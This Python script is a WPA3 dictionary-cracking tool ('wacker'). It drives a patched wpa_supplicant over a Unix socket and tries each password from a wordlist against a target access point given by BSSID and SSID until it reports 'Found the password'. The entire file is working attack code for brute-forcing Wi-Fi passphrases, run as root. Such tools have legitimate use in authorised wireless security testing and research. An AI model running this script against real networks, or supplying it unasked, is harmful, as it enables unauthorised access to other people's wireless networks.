#!/usr/bin/env python3.7

import argparse
import logging
import os
import re
import signal
import socket
import stat
import subprocess
import sys
import time


def kill(sig, frame):
    try:
        wacker.kill()
    except:
        pass
    sys.exit(0)

signal.signal(signal.SIGINT, kill)

class Wacker(object):
    RETRY = 0
    SUCCESS = 1
    FAILURE = 2

    def __init__(self, args, start_word, start_time):
        self.args = args
        self.start_time = start_time
        self.start_word = start_word
        self.dir  = f'/tmp/wpa_supplicant'
        self.server = f'{self.dir}/{args.interface}'
        self.conf = f'{self.server}.conf'
        self.log  = f'{self.server}.log'
        self.wpa  = './wpa_supplicant-2.8/wpa_supplicant/wpa_supplicant'
        self.pid  = f'{self.server}.pid'
        self.me = f'{self.dir}/{args.interface}_client'
        self.cmd = f'{self.wpa} -P {self.pid} -d -B -i {self.args.interface} -c {self.conf} -f {self.log}'.split()
        wpa_conf = 'ctrl_interface={}\nupdate_config=1\n\nnetwork={{\n}}'.format(self.dir)
        self.total_count = int(subprocess.check_output(f'wc -l {args.wordlist.name}', shell=True).split()[0].decode('utf-8'))

        # Create supplicant dir and conf (first be destructive)
        os.system(f'mkdir {self.dir} 2> /dev/null')
        os.system(f'rm -f {self.dir}/{args.interface}*')
        with open(self.conf, 'w') as f:
            f.write(wpa_conf)

        logging.basicConfig(level=logging.DEBUG, filename=f'{self.server}_wacker.log', filemode='w', format='%(message)s')

    def create_uds_endpoints(self):
        ''' Create unix domain socket endpoints '''
        try:
            os.unlink(self.me)
        except Exception:
            if os.path.exists(self.me):
                raise

        # bring the interface up... won't connect otherwise
        os.system(f'ifconfig {self.args.interface} up')

        self.sock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        self.sock.bind(self.me)

        logging.debug(f'Connecting to {self.server}')
        try:
            self.sock.connect(self.server)
        except Exception:
            raise

    def start_supplicant(self):
        ''' Spawn a wpa_supplicant instance '''
        print(f'Starting wpa_supplicant...')
        proc = subprocess.Popen(self.cmd)
        time.sleep(2)
        logging.debug(f'Started wpa_supplicant')

        # Double check it's running
        mode = os.stat(self.server).st_mode
        if not stat.S_ISSOCK(mode):
            raise Exception(f'Missing {self.server}...Is wpa_supplicant running?')

    def send_to_server(self, msg):
        ''' Send a message to the supplicant '''
        logging.debug(f'sending {msg}')
        self.sock.sendall(msg.encode())
        d = self.sock.recv(1024).decode().rstrip('\n')
        if d == "FAIL":
            raise Exception(f'{msg} failed!')
        return d

    def one_time_setup(self):
        ''' One time setup needed for supplicant '''
        self.send_to_server('ATTACH')
        self.send_to_server(f'SET_NETWORK 0 ssid "{self.args.ssid}"')
        self.send_to_server(f'SET_NETWORK 0 key_mgmt SAE')
        self.send_to_server(f'SET_NETWORK 0 bssid {self.args.bssid}')
        self.send_to_server(f'SET_NETWORK 0 scan_freq {self.args.freq}')
        self.send_to_server(f'SET_NETWORK 0 freq_list {self.args.freq}')
        self.send_to_server(f'SET_NETWORK 0 ieee80211w 1')
        self.send_to_server(f'DISABLE_NETWORK 0')
        logging.debug(f'--- created network block 0 ---')

    def send_connection_attempt(self, psk):
        ''' Send a connection request to supplicant'''
        self.send_to_server(f'SET_NETWORK 0 sae_password "{psk}"')
        self.send_to_server(f'ENABLE_NETWORK 0')
        self.send_to_server('SAVE_CONFIG')

    def listen(self, count, word):
        ''' Listen for responses from supplicant '''
        while True:
            datagram = self.sock.recv(2048)
            if not datagram:
                logging.debug('WTF!!!! datagram is null?!?!?! Exiting.')
                return Wacker.RETRY

            data = datagram.decode().rstrip('\n')
            event = data.split()[0]
            logging.debug(data)
            lapse = time.time() - self.start_time
            if event == "<3>CTRL-EVENT-BRUTE-FAILURE":
                self.send_to_server(f'DISABLE_NETWORK 0')
                logging.debug('\n{0} {1} seconds, count={2} {0}\n'.format("-"*15, lapse, count))
                avg = count / lapse
                spot = self.start_word + count
                est = (self.total_count - spot) / avg
                # truncating the passphrases on the printouts for now
                print(f'{spot:9} / {self.total_count} words : {avg:6.2f} words/sec : {est:5.0f} secs to exhaust : word = {word[:10]:20}', end='\r')
                return Wacker.FAILURE
            elif event == "<3>CTRL-EVENT-BRUTE-SUCCESS":
                logging.debug('\n{0} {1} seconds, count={2} {0}\n'.format("-"*15, lapse, count))
                avg = count / lapse
                spot = self.start_word + count
                est = (self.total_count - spot) / avg
                print(f'{spot:9} / {self.total_count} words : {avg:6.2f} words/sec : {est:5.0f} secs to exhaust : word = {word}', end='\r')
                return Wacker.SUCCESS
            else:
                # do something with <3>CTRL-EVENT-SSID-TEMP-DISABLED ?
                pass

    def kill(self):
        ''' Kill the supplicant '''
        print(f'\nTime elapsed : {time.time() - self.start_time} seconds')
        os.kill(int(open(self.pid).read()), signal.SIGKILL)


def check_bssid(mac):
    if not re.match(r'^([0-9a-f]{2}(?::[0-9a-f]{2}){5})$', mac):
        raise argparse.ArgumentTypeError(f'{mac} is not a valid bssid')
    return mac


def check_interface(interface):
    if not os.path.isdir(f'/sys/class/net/{interface}/wireless/'):
        raise argparse.ArgumentTypeError(f'{interface} is not a wireless adapter')
    return interface


parser = argparse.ArgumentParser(description='A WPA3 dictionary cracker. Must run as root!')
parser.add_argument('--wordlist', type=argparse.FileType('r'), required=True, help='wordlist to use', dest='wordlist')
parser.add_argument('--interface', type=check_interface, dest='interface', required=True, help='interface to use')
parser.add_argument('--bssid', type=check_bssid, dest='bssid', required=True, help='bssid of the target')
parser.add_argument('--ssid', type=str, dest='ssid', required=True, help='the ssid of the WPA3 AP')
parser.add_argument('--freq', type=int, dest='freq', required=True, help='frequency of the ap')
parser.add_argument('--start', type=str, dest='start_word', help='word to start with in the wordlist')

args = parser.parse_args()

if os.geteuid() != 0:
    print('This script must be run as root!')
    sys.exit(0)

# Find requested startword
offset=0
start_word = 0
if args.start_word:
    print(f'Starting with word "{args.start_word}"')
    for word in args.wordlist:
        if word.rstrip('\n') == args.start_word:
            args.wordlist.seek(offset, os.SEEK_SET)
            break;
        offset += len(word.encode('utf-8'))
        start_word += 1
    else:
        print(f'Requested start word "{args.start_word}" not found!')
        wacker.kill()

start_time = time.time()
wacker = Wacker(args, start_word, start_time)
wacker.start_supplicant()
wacker.create_uds_endpoints()
wacker.one_time_setup()

# Start the cracking
count = 1
for word in args.wordlist:
    word = word.rstrip('\n')
    wacker.send_connection_attempt(word)
    result = wacker.listen(count, word)
    if result == Wacker.SUCCESS:
        print(f"\nFound the password: '{word}'")
        break
    #elif result == Wacker.RETRY:
    #    pass
    count += 1
else:
    print('\nFlag not found')

wacker.kill()
